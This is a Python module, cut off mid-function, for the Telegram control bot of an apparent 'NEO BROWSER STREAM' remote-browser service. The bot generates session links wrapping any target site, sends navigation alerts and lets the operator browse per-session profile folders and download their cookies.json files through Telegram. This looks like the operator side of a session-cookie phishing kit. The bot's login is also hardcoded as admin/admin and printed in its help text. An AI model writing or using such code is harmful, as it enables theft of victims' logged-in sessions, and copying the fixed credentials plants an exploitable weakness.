"""
Telegram Bot Module - Handles all Telegram-related functionality
"""

import asyncio
import logging
import time
import os
import hashlib
import re
import httpx
from typing import Dict, Optional, List, Any
from urllib.parse import quote
from pathlib import Path

logger = logging.getLogger(__name__)


class NotificationDeduplicator:
    """
    Prevents duplicate notifications from being sent.
    Uses a hash-based approach to detect duplicate messages within a time window.
    """
    
    def __init__(self, time_window_seconds: int = 30):
        self.time_window = time_window_seconds
        self._notifications: Dict[str, float] = {}  # hash -> timestamp
    
    def _generate_hash(self, message: str) -> str:
        """Generate a short hash for the message"""
        return hashlib.md5(message.encode()).hexdigest()[:16]
    
    def is_duplicate(self, message: str) -> bool:
        """
        Check if this message is a duplicate.
        Returns True if this message was sent within the time window.
        """
        current_time = time.time()
        msg_hash = self._generate_hash(message)
        
        # Check if hash exists and is within time window
        if msg_hash in self._notifications:
            last_sent = self._notifications[msg_hash]
            if current_time - last_sent < self.time_window:
                logger.debug(f"Duplicate notification blocked: {msg_hash[:8]}")
                return True
            else:
                # Hash exists but expired, remove it
                del self._notifications[msg_hash]
        
        return False
    
    def mark_sent(self, message: str):
        """Mark a message as sent"""
        msg_hash = self._generate_hash(message)
        self._notifications[msg_hash] = time.time()
        
        # Cleanup old entries periodically
        if len(self._notifications) > 100:
            self._cleanup_old_entries()
    
    def _cleanup_old_entries(self):
        """Remove expired entries to prevent memory buildup"""
        current_time = time.time()
        expired = [h for h, t in self._notifications.items() 
                   if current_time - t >= self.time_window]
        for h in expired:
            del self._notifications[h]


# Global notification deduplicator instance
notification_dedup = NotificationDeduplicator(time_window_seconds=30)


def sanitize_for_telegram(text: str) -> str:
    """
    Sanitize text for Telegram HTML parser.
    Fixes: "can't parse entities: Unsupported start tag" errors
    by ensuring the text is properly formatted for Telegram's HTML parser.
    """
    if not text:
        return ""
    
    # Remove BOM and other invisible characters at the start
    invisible_chars = [
        '\ufeff',  # BOM
        '\u200b',  # Zero-width space
        '\u200c',  # Zero-width non-joiner
        '\u200d',  # Zero-width joiner
        '\uffef',  # Replacement character
    ]
    
    result = text
    for char in invisible_chars:
        result = result.replace(char, '')
    
    # Strip leading/trailing whitespace but preserve internal structure
    result = result.strip()
    
    # If text starts with an HTML tag character, ensure it's valid
    if result.startswith('<') and not result.startswith(('<b>', '<i>', '<code>', '<pre>', '<a ', '<strong>', '<em>')):
        if '>' not in result:
            result = '&lt;' + result[1:]
    
    # Ensure text doesn't start with a closing tag that has no opening
    if result.startswith('</'):
        result = '\u200b' + result
    
    # Replace any literal "<" characters in text with &lt; unless they're part of valid tags
    import re
    
    # Pattern to match valid HTML tags in Telegram format
    valid_tag_pattern = r'<(/?)(b|i|code|pre|strong|em)\s*(>|>[^<]*</[^>]+>)|<(/?)a\s+href="([^"]+)"\s*(>|>[^<]*</a>)'
    
    # Split text into parts: tags and non-tags
    parts = []
    last_end = 0
    
    tag_pattern = r'<[^>]+>'
    for match in re.finditer(tag_pattern, result):
        if match.start() > last_end:
            parts.append(('text', result[last_end:match.start()]))
        parts.append(('tag', match.group()))
        last_end = match.end()
    
    if last_end < len(result):
        parts.append(('text', result[last_end:]))
    
    # Process each part
    sanitized_parts = []
    for part_type, content in parts:
        if part_type == 'text':
            content = content.replace('<', '&lt;')
            sanitized_parts.append(content)
        else:
            tag_lower = content.lower()
            allowed_tags = ['<b>', '</b>', '<i>', '</i>', '<code>', '</code>', 
                          '<pre>', '</pre>', '<strong>', '</strong>', '<em>', '</em>']
            
            if tag_lower.startswith('<a ') or tag_lower.startswith('</a>'):
                if 'href="' in tag_lower:
                    sanitized_parts.append(content)
                else:
                    sanitized_parts.append(content.replace('<', '&lt;'))
            elif tag_lower in allowed_tags:
                sanitized_parts.append(content)
            else:
                sanitized_parts.append(content.replace('<', '&lt;'))
    
    result = ''.join(sanitized_parts)
    
    if result.startswith('&lt;'):
        pass  # Keep as is since we escaped it intentionally
    
    if not result:
        return ""
    
    return result


def sanitize_for_telegram_simple(text: str) -> str:
    """
    Simple sanitization for Telegram HTML - strips invisible chars and fixes common issues.
    """
    if not text:
        return ""

    # Remove BOM and zero-width characters
    result = text
    result = result.replace('\ufeff', '')
    result = result.replace('\u200b', '')
    result = result.replace('\u200c', '')
    result = result.replace('\u200d', '')
    result = result.replace('\uffef', '')

    # Strip but preserve structure
    result = result.strip()

    if not result:
        return ""

    stripped = result.replace(' ', '').replace('\n', '')
    if not stripped or all(c in '<>/' for c in stripped):
        return result

    if result.startswith('<') and not any(result.lower().startswith(tag) for tag in ['<b>', '<i>', '<code>', '<pre>', '<a ', '<strong>', '<em>']):
        if result.startswith('</'):
            result = ' ' + result

    return result


def to_monospace(text: str) -> str:
    """
    Backwards-compatible stub.  The previous implementation converted
    plain text to MATHEMATICAL MONOSPACE Unicode characters, but the
    look-and-feel was too rigid -- every URL, ID, and value got the
    same uniform treatment regardless of importance, and the
    "fake monospace" glyphs made natural sentences (with their
    normal word shapes) impossible.

    We now use Telegram's native HTML formatting instead: <b> for
    highlights, <a href> for clickable links, and natural plain
    text everywhere else.  This stub is kept so any external
    caller that still imports `to_monospace` keeps working -- it
    just passes the text through unchanged.
    """
    return text


def to_bold_highlights(message: str) -> str:
    """
    Convert common "Label: value" / "Label → value" patterns in plain
    text into Telegram-friendly HTML with <b>...</b> around the label.

    This is the natural successor to the old monospace formatter: the
    *labels* (the parts the eye is drawn to) get a bold highlight, and
    the *values* stay in regular weight so the message reads like
    prose instead of a uniform slab of fake-monospace glyphs.

    Patterns handled:
        "User: abc123"         -> "<b>User:</b> abc123"
        "Name → John"          -> "<b>Name</b> → John"
        "Status: Ready ✅"     -> "<b>Status:</b> Ready ✅"
        "- Name: foo"          -> "- <b>Name:</b> foo"   (leading dash kept)
        "  Name: foo"          -> "  <b>Name:</b> foo"   (leading spaces kept)

    Lines that already contain an HTML tag are passed through
    untouched so we don't double-format messages that were already
    rendered with <b> / <a> / <code>.
    """
    import re

    if not message:
        return message

    # Skip if the line already has HTML markup -- the caller is
    # already in control of formatting.
    if re.search(r"<\s*(b|strong|i|em|code|pre|a\s)", message, flags=re.IGNORECASE):
        return message

    # Match "Label: value" or "Label → value" at the start of a line
    # (after optional leading whitespace / list markers).  We use a
    # non-greedy label capture that stops at the first separator;
    # for "Name → John" we treat "Name" as the label and "John" as
    # the value, NOT "Name → John" as a label.
    # The lead class covers whitespace plus common bullet / tree
    # markers: '-', '•', '*', '|', '├', '└', '┌', '┤', '─'.
    label_pattern = re.compile(
        r"^(?P<lead>[\s\-\•\*\|├└┌┤─│]*)(?P<label>[A-Za-z][A-Za-z0-9 _\-]{0,40}?)(?P<sep>:\s+|→\s+|\s+→\s+)(?P<rest>.*)$",
        flags=re.DOTALL,
    )
    m = label_pattern.match(message)
    if not m:
        return message

    lead = m.group("lead")
    label = m.group("label").strip()
    sep = m.group("sep")
    rest = m.group("rest")

    # Only bold when the "label" actually looks like a short label
    # (no spaces inside, or a known short phrase).  Long sentences
    # get left alone -- bolding "User clicked the big blue button
    # in the upper right corner because:" is not what the user
    # wants; bolding "User:" or "Status:" is.
    if " " in label and len(label) > 16:
        return message

    # Render the separator in bold too so the bold runs the full
    # "Name →" / "User:" block, matching the eye's natural
    # "left-side emphasis" expectation.
    if sep.strip().startswith("→"):
        sep_rendered = " →"
    else:
        sep_rendered = ":"

    return f"{lead}<b>{label}{sep_rendered}</b> {rest}"


def format_html_message(message: str) -> str:
    """
    Format a message with proper HTML styling.
    - <b>...</b> for bold text (highlights important info)
    - <a href="...">...</a> for clickable links
    - Preserves structure while adding visual emphasis

    Crucially, this does NOT double-wrap URLs that are already inside
    an existing <a>...</a> tag, so calling it on a message that was
    already pre-formatted with clickable links (e.g. the connect
    notification built in session_manager) is safe.
    """
    import re

    # Walk the string left-to-right, tracking whether we're inside an
    # <a>...</a> pair.  URLs encountered while inside an <a> pair
    # (the visible link text) are passed through untouched -- they
    # already render as a clickable link thanks to the parent <a>.
    result = []
    i = 0
    n = len(message)
    url_pattern = re.compile(r'https?://[^\s<>]+')
    open_a = re.compile(r'<a\s+[^>]*>', re.IGNORECASE)
    close_a = re.compile(r'</a\s*>', re.IGNORECASE)

    inside_a = False
    while i < n:
        if message[i] == '<':
            # Find the end of the tag
            tag_end = message.find('>', i)
            if tag_end == -1:
                # Malformed: bail out, copy the rest as-is
                result.append(message[i:])
                break
            tag = message[i:tag_end + 1]
            if open_a.match(tag):
                inside_a = True
            elif close_a.match(tag):
                inside_a = False
            result.append(tag)
            i = tag_end + 1
            continue

        if inside_a:
            # Already inside an <a> tag -- copy the next chunk
            # verbatim until the closing </a>.  We don't try to
            # detect nested URLs here because that's the rare case
            # and double-wrapping inside an existing <a> would
            # produce broken HTML anyway.
            next_close = message.lower().find('</a>', i)
            if next_close == -1:
                result.append(message[i:])
                break
            result.append(message[i:next_close])
            i = next_close
            continue

        # Outside any <a> tag -- auto-link bare URLs.
        m = url_pattern.match(message, i)
        if m:
            url = m.group(0)
            result.append(f'<a href="{url}">{url}</a>')
            i += len(url)
            continue

        # Regular character
        result.append(message[i])
        i += 1

    return ''.join(result)


def format_telegram_html(message: str, use_bold: bool = True, convert_links: bool = True) -> str:
    """
    Main formatter for Telegram HTML messages.
    Applies natural-text HTML formatting: <b> for highlights,
    <a href> for clickable links, and regular text everywhere else.
    Replaces the old monospace-only approach so messages read like
    prose instead of a uniform slab of fake-monospace glyphs.
    """
    # First auto-convert bare URLs to clickable links
    if convert_links:
        message = format_html_message(message)

    # Then bold the label parts of "Label: value" patterns, but
    # only on lines that don't already carry HTML tags (so we don't
    # double-format messages that the caller already pre-styled).
    if use_bold:
        lines = message.split("\n")
        out = []
        for line in lines:
            if "<" in line and re.search(r"<\s*(b|strong|i|em|code|pre|a\s)", line, flags=re.IGNORECASE):
                out.append(line)
            else:
                out.append(to_bold_highlights(line))
        message = "\n".join(out)

    return message


def format_key_value(label: str, value: str, include_arrow: bool = True) -> str:
    """
    Format a key-value pair with proper styling.
    Example: "Name" -> "Admin" becomes: <b>Name</b> → "Admin"
    """
    arrow = " → " if include_arrow else " "
    return f"<b>{label}</b>{arrow}{value}"


def format_link(text: str, url: str) -> str:
    """
    Build a clickable HTML link for Telegram.
    Uses Telegram's <a href="...">...</a> syntax.
    Both text and URL are HTML-escaped so any special character in the
    URL (ampersand, quote, etc.) won't break the markup.

    Example:
        format_link("Open Google", "https://google.com/?q=1&r=2")
        -> '<a href="https://google.com/?q=1&amp;r=2">Open Google</a>'
    """
    def _escape(s: str) -> str:
        return (
            s.replace('&', '&amp;')
             .replace('"', '&quot;')
             .replace('<', '&lt;')
             .replace('>', '&gt;')
        )
    return f'<a href="{_escape(url)}">{_escape(text)}</a>'


def format_telegram_message(message: str) -> str:
    """
    Format a Telegram message with natural text, bold highlights, and
    clickable links.  Replaces the old monospace frame.  Emojis and
    structure are preserved as-is so messages read like prose.
    """
    # Apply bold highlights + link conversion.  We don't wrap the
    # message in an ASCII frame anymore -- the old "┏━━━...┛" box
    # forced every line into the same visual lane.  Natural text
    # plus bold labels gives the eye the same anchor points
    # without the rigidity.
    return format_telegram_html(message, use_bold=True, convert_links=True)


def format_telegram_message_simple(message: str) -> str:
    """
    Simple message formatter.  Natural text with bold highlights on
    labels, no surrounding frame.  Suits short messages where a
    full frame would be overkill.
    """
    return format_telegram_html(message, use_bold=True, convert_links=True)


def extract_profile_id(folder_name: str) -> str:
    """
    Extract profile ID from folder name.
    Example: "user_1770753399007_wuukl20qj" -> "07_wuukl20qj"
    """
    parts = folder_name.split('_')
    if len(parts) >= 3:
        timestamp = parts[-2] if len(parts) >= 2 else ""
        profile_id = parts[-1] if parts else ""
        if len(timestamp) >= 2:
            short_ts = timestamp[-2:]
            return f"{short_ts}_{profile_id}"
        return profile_id
    return folder_name


async def send_telegram_notification(message: str, config) -> bool:
    """
    Send a notification message to Telegram.
    This is a non-blocking function that sends messages asynchronously.
    Messages are rendered as natural text with <b> bold highlights
    and <a href> clickable links -- no more monospace-only styling.
    
    Args:
        message: The message text to send
        config: Configuration object with telegram settings
        
    Returns:
        True if the message was sent successfully, False otherwise
    """
    # Check if Telegram is enabled and configured
    if not getattr(config, 'telegram_enabled', False):
        return False
    
    bot_token = getattr(config, 'telegram_bot_token', '')
    chat_id = getattr(config, 'telegram_chat_id', '')
    
    if not bot_token or not chat_id:
        return False
    
    # Apply natural-text formatting: bold label highlights, clickable
    # links, regular weight on values.  We do NOT wrap the result in
    # an ASCII frame anymore -- the previous top/bottom border lines
    # pushed everything into a uniform visual lane regardless of the
    # content.  Bold labels give the eye the same anchor points
    # without the rigidity.
    formatted_message = format_telegram_html(message, use_bold=True, convert_links=True)
    
    # Sanitize text for Telegram HTML parser
    sanitized_message = sanitize_for_telegram_simple(formatted_message)
    
    # Check for duplicate notification
    if notification_dedup.is_duplicate(sanitized_message):
        logger.debug("[TELEGRAM] Duplicate blocked")
        return False
    
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": sanitized_message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }
            
            response = await client.post(url, json=payload)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    notification_dedup.mark_sent(sanitized_message)
                    logger.debug("[TELEGRAM] Sent")
                    return True
                else:
                    logger.warning(f"[TELEGRAM] API error: {data.get('description', 'Unknown')}")
                    return False
            else:
                logger.error(f"[TELEGRAM] HTTP {response.status_code}")
                return False
                
    except httpx.TimeoutException:
        logger.warning("[TELEGRAM] Timeout")
        return False
    except httpx.RequestError as e:
        logger.warning(f"[TELEGRAM] Request error: {e}")
        return False
    except Exception as e:
        logger.error(f"[TELEGRAM] Error: {e}")
        return False


class TelegramBot:
    """
    Telegram Bot class handling all bot functionality.
    """
    
    def __init__(self, config, server_instance=None):
        self.config = config
        self.server = server_instance
        self.shutdown_event = None
        self.polling_task = None
        self.last_update_id = None
        # Track logged-in users: {chat_id: {user_id, username, first_name, login_time}}
        self.logged_in_users: Dict[str, dict] = {}
        # Track in-progress file downloads to prevent duplicates
        self.downloading_files: Dict[str, float] = {}
        # Track processed update IDs to prevent duplicates
        self._processed_update_ids: set = set()
    
    def set_shutdown_event(self, event: asyncio.Event):
        """Set the shutdown event for the polling loop"""
        self.shutdown_event = event
    
    async def start_polling(self):
        """Start the Telegram polling loop"""
        self.polling_task = asyncio.create_task(self._polling_loop())
    
    async def stop_polling(self):
        """Stop the Telegram polling loop"""
        if self.polling_task:
            self.polling_task.cancel()
            try:
                await self.polling_task
            except asyncio.CancelledError:
                pass
    
    async def _polling_loop(self):
        """
        Poll Telegram for updates and handle commands.
        Supports /link command to generate client links.
        """
        while True:
            if self.shutdown_event and self.shutdown_event.is_set():
                break
            try:
                await self._poll_telegram_updates()
                await asyncio.sleep(3)  # Poll every 3 seconds
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.debug(f"[POLL] Error: {e}")
    
    async def _poll_telegram_updates(self):
        """Poll for Telegram updates and handle commands"""
        if not getattr(self.config, 'telegram_enabled', False):
            return
        
        bot_token = getattr(self.config, 'telegram_bot_token', '')
        chat_id = getattr(self.config, 'telegram_chat_id', '')
        
        if not bot_token or not chat_id:
            return
        
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                url = f"https://api.telegram.org/bot{bot_token}/getUpdates"
                params = {"timeout": 30, "limit": 100}
                if self.last_update_id:
                    params["offset"] = self.last_update_id + 1
                
                response = await client.get(url, params=params)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("ok"):
                        updates = data.get("result", [])
                        for update in updates:
                            update_id = update.get("update_id")
                            
                            # Skip if already processed (prevents duplicate messages)
                            if update_id in self._processed_update_ids:
                                self.last_update_id = update_id
                                continue
                            
                            # Mark as processed
                            self._processed_update_ids.add(update_id)
                            
                            # Limit the size of processed set
                            if len(self._processed_update_ids) > 1000:
                                self._processed_update_ids = set(list(self._processed_update_ids)[-500:])
                            
                            await self._handle_telegram_update(update)
                            self.last_update_id = update_id
                            
        except Exception as e:
            logger.debug(f"[POLL] Update error: {e}")
    
    async def _handle_telegram_update(self, update: dict):
        """Handle a single Telegram update"""
        # Handle callback queries (inline keyboard button clicks)
        callback_query = update.get("callback_query", {})
        if callback_query:
            callback_chat_id = str(callback_query.get("message", {}).get("chat", {}).get("id", ""))
            configured_chat_id = str(getattr(self.config, 'telegram_chat_id', ''))
            if callback_chat_id == configured_chat_id:
                await self._handle_profile_callback(callback_query)
            return
        
        # Handle regular messages
        message = update.get("message", {})
        if not message:
            return
        
        chat_id_msg = str(message.get("chat", {}).get("id", ""))
        
        # Only respond to the configured chat_id
        configured_chat_id = str(getattr(self.config, 'telegram_chat_id', ''))
        if chat_id_msg != configured_chat_id:
            return
        
        text = message.get("text", "")
        parts = text.strip().split()
        command = parts[0] if parts else ""
        
        # Handle commands
        if command == "/start":
            await self._handle_start_command(chat_id_msg, message)
        elif command == "/login":
            await self._handle_login_command(chat_id_msg, parts)
        elif command == "/logout":
            await self._handle_logout_command(chat_id_msg)
        elif not self._is_user_logged_in(chat_id_msg):
            await self._send_telegram_message(chat_id_msg, "🔐 <b>Login Required</b>\n\nPlease login first using <code>/login admin admin</code>")
        elif command == "/link":
            target_url = parts[1] if len(parts) > 1 else "https://www.google.com"
            await self._handle_link_command(chat_id_msg, target_url)
        elif command == "/status":
            await self._handle_status_command(chat_id_msg)
        elif command == "/help":
            await self._handle_help_command(chat_id_msg)
        elif command == "/profiles":
            await self._handle_profiles_command(chat_id_msg)
    
    def _is_user_logged_in(self, chat_id: str) -> bool:
        """Check if user is logged in"""
        return chat_id in self.logged_in_users
    
    def _get_user_display_name(self, chat_id: str) -> str:
        """Get display name for logged in user"""
        user_data = self.logged_in_users.get(chat_id, {})
        first_name = user_data.get('first_name', 'User')
        return first_name
    
    async def _handle_start_command(self, chat_id: str, message: dict):
        """Handle /start command"""
        message_text = """
🚀 <b>NEO BROWSER STREAM</b>

Welcome, Admin!
Please login to continue.

🔑 <b>LOGIN</b>
<code>/login admin admin</code>

Type /help for all commands"""
        await self._send_telegram_message(chat_id, message_text.strip())

    async def _handle_login_command(self, chat_id: str, parts: list):
        """Handle /login command"""
        if len(parts) < 3:
            message_text = """
⚠️ <b>AUTHENTICATION ERROR</b>

<b>Missing Credentials</b>

📋 <b>USAGE</b>
<code>/login admin admin</code>"""
            await self._send_telegram_message(chat_id, message_text.strip())
            return

        username = parts[1]
        password = parts[2]

        # Check credentials
        if username == "admin" and password == "admin":
            user_data = {
                'user_id': chat_id,
                'username': username,
                'first_name': 'Admin',
                'login_time': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            self.logged_in_users[chat_id] = user_data

            message_text = """
✅ <b>LOGIN SUCCESSFUL</b>

Welcome back, Admin!
Type /help for commands"""
            await self._send_telegram_message(chat_id, message_text.strip())
        else:
            message_text = """
❌ <b>AUTHENTICATION ERROR</b>

<b>Invalid Credentials</b>
Please check your username and password"""
            await self._send_telegram_message(chat_id, message_text.strip())

    async def _handle_logout_command(self, chat_id: str):
        """Handle /logout command"""
        if chat_id in self.logged_in_users:
            del self.logged_in_users[chat_id]
            message_text = """
👋 <b>LOGGED OUT</b>

Goodbye, Admin!
You have been logged out successfully"""
            await self._send_telegram_message(chat_id, message_text.strip())
        else:
            message_text = """
🔒 <b>NOT LOGGED IN</b>

<b>No Active Session</b>
Use /login admin admin to login first"""
            await self._send_telegram_message(chat_id, message_text.strip())
    
    async def _handle_link_command(self, chat_id: str, target_url: str = "https://www.google.com"):
        """Handle /link command - generate a client link"""
        try:
            from api import create_auth_link
            
            # Generate authenticated link
            link_data = create_auth_link(target_url)
            auth_id = link_data["auth_id"]
            
            # Get server URL
            server_domain = getattr(self.config, 'server_domain', '')
            use_https = getattr(self.config, 'use_https', False)
            
            if server_domain:
                protocol = "https" if use_https else "http"
                final_link = f"{protocol}://{server_domain}/client.html?auth={auth_id}&url={quote(target_url, safe='')}"
            else:
                message_text = """
⚙️ <b>CONFIGURATION ERROR</b>

<b>Server Domain Not Set</b>
Please set <code>server_domain</code> in config"""
                await self._send_telegram_message(chat_id, message_text.strip())
                return

            user_name = self._get_user_display_name(chat_id)
            short_target = target_url[:40] + ('...' if len(target_url) > 40 else '')
            clickable_link = format_link("🔗  Open Browser Session", final_link)
            message = f"""
🔗 <b>LINK GENERATED</b>

Hello, {user_name}!

📋 <b>DETAILS</b>
<b>Auth ID:</b> {auth_id}
<b>Target:</b> {short_target}

🚀 <b>OPEN CLIENT</b>

{clickable_link}

<b>Status:</b> Ready to use ✅"""
            await self._send_telegram_message(chat_id, message.strip())

        except Exception as e:
            logger.error(f"[LINK] Error: {e}")
            message_text = """
❌ <b>ERROR</b>

<b>Link Generation Failed</b>
Please try again"""
            await self._send_telegram_message(chat_id, message_text.strip())
    
    async def _handle_status_command(self, chat_id: str):
        """Handle /status command"""
        try:
            if self.server and hasattr(self.server, 'session_manager'):
                session_count = len(self.server.session_manager.sessions)
                max_sessions = self.config.max_sessions
                gpu_status = self.server.gpu_manager.get_status()
                
                user_name = self._get_user_display_name(chat_id)
                message = f"""
🖥️ <b>SERVER STATUS</b>

Welcome, {user_name}!

📊 <b>SYSTEM INFO</b>
<b>Active Sessions:</b> {session_count}/{max_sessions}
<b>GPU Memory:</b> {gpu_status.get('gpu_memory_used_mb', 0):.1f} MB
<b>GPU Utilization:</b> {gpu_status.get('gpu_utilization', 0):.1f}%

🕐 <b>UPDATED</b>
{time.strftime('%Y-%m-%d %H:%M:%S')}"""
                await self._send_telegram_message(chat_id, message.strip())
            
        except Exception as e:
            logger.error(f"[STATUS] Error: {e}")
    
    async def _handle_help_command(self, chat_id: str):
        """Handle /help command"""
        nav_enabled = getattr(self.config, 'telegram_notify_on_navigation', True)
        nav_status = "✅ Enabled" if nav_enabled else "❌ Disabled"
        
        user_name = self._get_user_display_name(chat_id)
        nav_enabled = getattr(self.config, 'telegram_notify_on_navigation', True)
        nav_status = "Enabled" if nav_enabled else "Disabled"
        
        message = f"""
📚 <b>HELP MENU</b>

🔐 <b>AUTHENTICATION</b>
<code>/login admin admin</code> — Login
<code>/logout</code> — Logout

🔗 <b>LINK GENERATION</b>
<code>/link</code> — Generate link
<code>/link [url]</code> — Custom URL

🖥️ <b>SERVER</b>
<code>/status</code> — View status

📂 <b>DATA</b>
<code>/profiles</code> — Browse profiles

🔔 <b>NOTIFICATIONS</b>
<b>Nav Alerts:</b> {nav_status}

Type /help for this menu"""
        await self._send_telegram_message(chat_id, message.strip())
    
    async def _handle_profiles_command(self, chat_id: str):
        """Handle /profiles command"""
        try:
            profile_base_path = self.config.profile_base_path
            if not os.path.exists(profile_base_path):
                await self._send_telegram_message(chat_id, "📁 <b>No Profiles Found</b>\n\nProfile directory does not exist.")
                return
            
            profiles = []
            for folder_name in sorted(os.listdir(profile_base_path)):
                folder_path = os.path.join(profile_base_path, folder_name)
                if os.path.isdir(folder_path):
                    profile_id = extract_profile_id(folder_name)
                    files_count = 0
                    if os.path.exists(os.path.join(folder_path, 'cookies.json')):
                        files_count += 1
                    if os.path.exists(os.path.join(folder_path, 'about.txt')):
                        files_count += 1
                    profiles.append({
                        "name": folder_name,
                        "profile_id": profile_id,
                        "path": folder_path,
                        "files_count": files_count
                    })
            
            if not profiles:
                await self._send_telegram_message(chat_id, "📁 <b>No Profiles Found</b>\n\nNo profiles available.")
                return
            
            keyboard = []
            row = []
            for i, profile in enumerate(profiles):
                button_text = to_monospace(f"{profile['profile_id']}")
                callback_data = f"profile:{profile['name']}"
                row.append({"text": button_text, "callback_data": callback_data})
                
                if len(row) == 3:
                    keyboard.append(row)
                    row = []
            
            if row:
                keyboard.append(row)
            
            keyboard.append([{"text": "🔄 Refresh", "callback_data": "profiles:refresh"}])
            
            user_name = self._get_user_display_name(chat_id)
            message_text = f"""
👋 Welcome, {user_name}!

📂 <b>Your Profiles</b>

Select a profile to browse its files

📊 <b>Total Profiles:</b> {to_monospace(str(len(profiles)))}
"""

            await self._send_telegram_inline_keyboard(chat_id, message_text.strip(), keyboard)

        except Exception as e:
            logger.error(f"[PROFILES] Error: {e}")
            await self._send_telegram_message(chat_id, f"⚠️ <b>Error Loading Profiles</b>\n\n{str(e)}")
    
    async def _handle_profile_callback(self, callback_query: dict):
        """Handle callback queries from inline keyboard"""
        try:
            callback_data = callback_query.get("data", "")
            message = callback_query.get("message", {})
            chat_id = str(message.get("chat", {}).get("id", ""))
            message_id = message.get("message_id", 0)
            
            if callback_data == "profiles:refresh":
                await self._handle_profiles_command(chat_id)
                await self._answer_callback_query(callback_query.get("id", ""), "Profiles refreshed!")
                return
            
            if ":" not in callback_data:
                return
            
            action, value = callback_data.split(":", 1)
            
            if action == "profile":
                await self._show_profile_folder(chat_id, message_id, value)
                await self._answer_callback_query(callback_query.get("id", ""), f"Opened {value}")
            elif action == "back":
                await self._handle_profiles_command(chat_id)
                await self._answer_callback_query(callback_query.get("id", ""), "Back to profiles")
            elif action == "file":
                parts = value.split("|", 1)
                if len(parts) == 2:
                    profile_name, file_name = parts
                    await self._send_file_to_telegram(chat_id, profile_name, file_name)
                    await self._answer_callback_query(callback_query.get("id", ""), f"Sending {file_name}...")
            
        except Exception as e:
            logger.error(f"[CALLBACK] Error: {e}")
            await self._answer_callback_query(callback_query.get("id", ""), f"Error: {str(e)}")
    
    async def _show_profile_folder(self, chat_id: str, message_id: int, profile_name: str):
        """Show files in a profile folder"""
        try:
            profile_base_path = self.config.profile_base_path
            profile_path = os.path.join(profile_base_path, profile_name)
            
            if not os.path.exists(profile_path):
                await self._edit_telegram_message(chat_id, message_id, "📁 <b>Profile Not Found</b>\n\nThe profile folder does not exist.")
                return
            
            files = []
            allowed_files = ['cookies.json', 'about.txt', 'About.txt', 'Cookies.json']
            for file_name in sorted(os.listdir(profile_path)):
                file_path = os.path.join(profile_path, file_name)
                if os.path.isfile(file_path) and file_name.lower() in [f.lower() for f in allowed_files]:
                    file_size = os.path.getsize(file_path)
                    files.append({
                        "name": file_name,
                        "path": file_path,
                        "size": file_size
                    })
            
            if not files:
                await self._edit_telegram_message(chat_id, message_id, "📄 <b>No Files Found</b>\n\nNo accessible files in this profile.")
                return
            
            keyboard = []
            for file_info in files:
                file_name = file_info["name"]
                file_size = file_info["size"]
                
                if file_size < 1024:
                    size_str = f"{file_size}B"
                elif file_size < 1024 * 1024:
                    size_str = f"{file_size // 1024}KB"
                else:
                    size_str = f"{file_size // (1024 * 1024)}MB"
                
                button_text = to_monospace(f"{file_name} ({size_str})")
                callback_data = f"file:{profile_name}|{file_name}"
                keyboard.append([{"text": button_text, "callback_data": callback_data}])
            
            keyboard.append([{"text": "⬅️ Back to Profiles", "callback_data": "back:profiles"}])
            
            profile_id = extract_profile_id(profile_name)
            message_text = f"""
📂 <b>Profile:</b> {to_monospace(profile_id)}

👇 Click on a file to download it

📄 <b>Files:</b> {to_monospace(str(len(files)))}
"""

            await self._edit_telegram_inline_keyboard(chat_id, message_id, message_text.strip(), keyboard)

        except Exception as e:
            logger.error(f"[PROFILE] Error: {e}")
            await self._edit_telegram_message(chat_id, message_id, f"Error loading folder: {str(e)}")
    
    async def _send_file_to_telegram(self, chat_id: str, profile_name: str, file_name: str):
        """Send a file to Telegram user"""
        download_key = f"{profile_name}|{file_name}"
        current_time = time.time()
        
        # Check for duplicates
        if download_key in self.downloading_files:
            last_time = self.downloading_files[download_key]
            if current_time - last_time < 30:
                logger.debug(f"[FILE] Duplicate blocked for {file_name}")
                return
            else:
                self.downloading_files.pop(download_key, None)
        
        self.downloading_files[download_key] = current_time
        
        try:
            profile_base_path = self.config.profile_base_path
            file_path = os.path.join(profile_base_path, profile_name, file_name)
            
            if not os.path.exists(file_path):
                await self._send_telegram_message(chat_id, f"📁 <b>File Not Found</b>\n\nThe file {to_monospace(file_name)} does not exist.")
                self.downloading_files.pop(download_key, None)
                return

            try:
                with open(file_path, 'rb') as f:
                    file_content = f.read()
            except Exception as e:
                await self._send_telegram_message(chat_id, f"❌ <b>Error Reading File</b>\n\n{str(e)}")
                self.downloading_files.pop(download_key, None)
                return

            bot_token = getattr(self.config, 'telegram_bot_token', '')

            if not bot_token:
                await self._send_telegram_message(chat_id, "⚠️ <b>Configuration Error</b>\n\nTelegram bot token not configured.")
                self.downloading_files.pop(download_key, None)
                return
            
            file_size_kb = len(file_content) / 1024
            file_size_str = f"{file_size_kb:.1f} KB" if file_size_kb >= 1 else f"{len(file_content)} B"
            
            notification_message = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃            📤 <b>FILE UPLOAD</b>                ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

├── 📄 <b>FILE INFO</b>
│   ├── <b>Name</b>        → {to_monospace(file_name)}
│   └── <b>Size</b>        → {to_monospace(file_size_str)}
│
├── 👤 <b>PROFILE</b>
│   └── <b>ID</b>          → {to_monospace(profile_name)}
│
└── ⏳ <b>STATUS</b>
    └── Uploading to Telegram... 📤
"""
            await self._send_telegram_message(chat_id, notification_message.strip())
            
            async with httpx.AsyncClient(timeout=60.0) as client:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                
                files = {
                    'document': (file_name, file_content, 'application/octet-stream')
                }
                data = {
                    'chat_id': chat_id,
                    'caption': f"📄 {to_monospace(file_name)}\n👤 {to_monospace('Profile:')} {to_monospace(profile_name)}"
                }
                
                response = await client.post(url, data=data, files=files)
                
                if response.status_code == 200 and response.json().get("ok"):
                    logger.debug(f"[FILE] Sent {file_name}")
                else:
                    error_msg = response.json().get("description", "Unknown error")
                    logger.warning(f"[FILE] Failed: {error_msg}")
